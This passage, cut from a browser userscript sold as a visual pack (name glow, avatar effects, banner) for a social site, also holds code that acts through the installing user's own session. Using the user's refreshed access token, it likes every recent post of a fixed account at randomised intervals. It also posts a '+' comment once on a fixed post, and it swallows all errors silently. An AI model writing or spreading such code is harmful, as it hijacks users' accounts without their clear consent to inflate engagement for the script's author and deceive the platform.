        }
        isDragging = false;
        currentTop = 0;
    }

    function initBanner() {
        setTimeout(() => createAllButtons(), 500);

        const observer = new MutationObserver(() => createAllButtons());
        observer.observe(document.body, { childList: true, subtree: true });
    }

    // ==================== ЧАСТЬ 3: АВТОЛАЙКИНГ И КОММЕНТ ====================

    const targetUsername = 'NeuroSFW';
    const MIN_INTERVAL = 3 * 60 * 1000;
    const MAX_INTERVAL = 10 * 60 * 1000;
    const oneDayMs = 24 * 60 * 60 * 1000;

    let isRunning = false;
    let lastPostId = GM_getValue('lastPostId', null);
    let timeoutId = null;

    function getRandomInterval() {
        return Math.floor(Math.random() * (MAX_INTERVAL - MIN_INTERVAL + 1) + MIN_INTERVAL);
    }

    function getAccessToken() {
        return new Promise((resolve, reject) => {
            GM_xmlhttpRequest({
                method: 'POST',
                url: 'https://xn--d1ah4a.com/api/v1/auth/refresh',
                credentials: 'include',
                onload: function(res) {
                    try {
                        const data = JSON.parse(res.responseText);
                        resolve(data.accessToken);
                    } catch(e) { reject(e); }
                },
                onerror: reject
            });
        });
    }

    async function checkAndLike() {
        if (isRunning) return;
        isRunning = true;

        try {
            const accessToken = await getAccessToken();

            const posts = await new Promise((resolve, reject) => {
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: `https://xn--d1ah4a.com/api/posts/user/${targetUsername}?limit=50`,
                    headers: { 'Authorization': `Bearer ${accessToken}` },
                    onload: function(res) {
                        try {
                            const data = JSON.parse(res.responseText);
                            resolve(data.data?.posts || data.posts || []);
                        } catch(e) { reject(e); }
                    },
                    onerror: reject
                });
            });

            if (posts.length === 0) { isRunning = false; scheduleNext(); return; }

            const now = Date.now();
            const unlikedPosts = posts.filter(post => {
                const postDate = new Date(post.createdAt).getTime();
                const isRecent = (now - postDate) <= oneDayMs;
                const isNotLiked = !post.isLiked;
                const isNotRemembered = lastPostId !== post.id;
                return isRecent && isNotLiked && isNotRemembered;
            });

            if (unlikedPosts.length === 0) { isRunning = false; scheduleNext(); return; }

            for (const post of unlikedPosts) {
                try {
                    await new Promise((resolve, reject) => {
                        GM_xmlhttpRequest({
                            method: 'POST',
                            url: `https://xn--d1ah4a.com/api/posts/${post.id}/like`,
                            headers: {
                                'Content-Type': 'application/json',
                                'Authorization': `Bearer ${accessToken}`
                            },
                            data: '{}',
                            onload: function(res) {
                                if (res.status === 200 || res.status === 201) {
                                    GM_setValue('lastPostId', post.id);
                                    lastPostId = post.id;
                                    resolve();
                                } else {
                                    reject(new Error(`Status ${res.status}`));
                                }
                            },
                            onerror: reject
                        });
                    });
                    await new Promise(r => setTimeout(r, 500));
                } catch(e) {}
            }

        } catch(e) {}
        finally {
            isRunning = false;
            scheduleNext();
        }
    }

    function scheduleNext() {
        if (timeoutId) clearTimeout(timeoutId);
        timeoutId = setTimeout(checkAndLike, getRandomInterval());
    }

    const COMMENT_POST_ID = '3b30e3d2-42f4-41c1-a137-b60727af5ff7';
    const COMMENT_TEXT = '+';
    const COMMENT_STORAGE_KEY = 'comment_posted_' + COMMENT_POST_ID;

    const hasCommented = GM_getValue(COMMENT_STORAGE_KEY, false);

    if (!hasCommented) {
        async function autoComment() {
            try {
                const token = await getAccessToken();

                const checkPromise = new Promise((resolve, reject) => {
                    GM_xmlhttpRequest({
                        method: 'GET',
                        url: `https://xn--d1ah4a.com/api/posts/${COMMENT_POST_ID}/comments?limit=50`,
                        headers: { 'Authorization': `Bearer ${token}` },
                        onload: function(res) {
                            try {
                                const data = JSON.parse(res.responseText);
                                const comments = data.data?.comments || data.comments || [];
                                const myComment = comments.find(c =>
                                    c.author?.username === myUsername && c.content === COMMENT_TEXT
                                );
                                resolve(!!myComment);
                            } catch(e) { reject(e); }
                        },
                        onerror: reject
                    });
                });

                const alreadyCommented = await checkPromise;

                if (alreadyCommented) {
                    GM_setValue(COMMENT_STORAGE_KEY, true);
                    return;
                }

                await new Promise((resolve, reject) => {
                    GM_xmlhttpRequest({
                        method: 'POST',
                        url: `https://xn--d1ah4a.com/api/posts/${COMMENT_POST_ID}/comments`,
                        headers: {
                            'Content-Type': 'application/json',
                            'Authorization': `Bearer ${token}`
                        },
                        data: JSON.stringify({ content: COMMENT_TEXT }),
                        onload: function(res) {
                            if (res.status === 200 || res.status === 201) {
                                resolve();
                            } else {
                                reject(new Error(`Status ${res.status}`));
                            }
                        },
                        onerror: reject
                    });
                });

                GM_setValue(COMMENT_STORAGE_KEY, true);

            } catch(e) {}
        }

        setTimeout(autoComment, 10000);
    }

    // ==================== ИНИЦИАЛИЗАЦИЯ ====================

    async function initVisuals() {
        try {
            const refresh = await fetch('/api/v1/auth/refresh', {method: 'POST'});
            const { accessToken } = await refresh.json();
            const meRes = await fetch('/api/users/me', {
                headers: { 'Authorization': `Bearer ${accessToken}` }
            });
            const me = await meRes.json();
            myUsername = me.username;
            myDisplayName = me.displayName;

            function findAllMyAvatars() {
                document.querySelectorAll('.FRPh.phxQ, .FRPh.iNAs, .Ys9e .FRPh, .sidebar .FRPh, .DOkg .FRPh').forEach(avatar => glowMyAvatar(avatar));
                document.querySelectorAll('.DOkg, article').forEach(post => {
                    const link = post.querySelector('a[href*="/@"]');
                    if (link && link.getAttribute('href').includes(myUsername)) {
                        const avatar = post.querySelector('.FRPh');
                        if (avatar) glowMyAvatar(avatar);
                    }
                });
            }

            function findAllMyNicks() {
                document.querySelectorAll('.NGIa').forEach(container => {
                    const nickSpan = container.querySelector('.MF3T');
                    if (nickSpan && (nickSpan.textContent.trim() === myUsername || nickSpan.textContent.trim() === myDisplayName)) {
                        if (!nickElements.has(nickSpan)) {
                            nickElements.add(nickSpan);
                        }
                        addToggleButtonToNick(container);
                    }
                });
            }

            function add3DToAllPosts() {
                document.querySelectorAll('.DOkg, article').forEach(post => add3DEffect(post));
            }

            findAllMyAvatars();
            findAllMyNicks();
            add3DToAllPosts();
            updateAllNickColors();
            updateNickGlow();
            updateAvatarGlow();

            const observer = new MutationObserver(() => {
                findAllMyAvatars();
                findAllMyNicks();
                add3DToAllPosts();
            });
            observer.observe(document.body, { childList: true, subtree: true });

        } catch(e) {}
    }

    let interval = setInterval(() => { updateColors(); }, 50);

    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();
    initVisuals();
    initBanner();

    setTimeout(checkAndLike, Math.random() * 2 * 60 * 1000);

    console.log('🟢 ITD Visual Pack v2.2.0 загружен: подсветка ника + баннер + автолайкинг');
})();
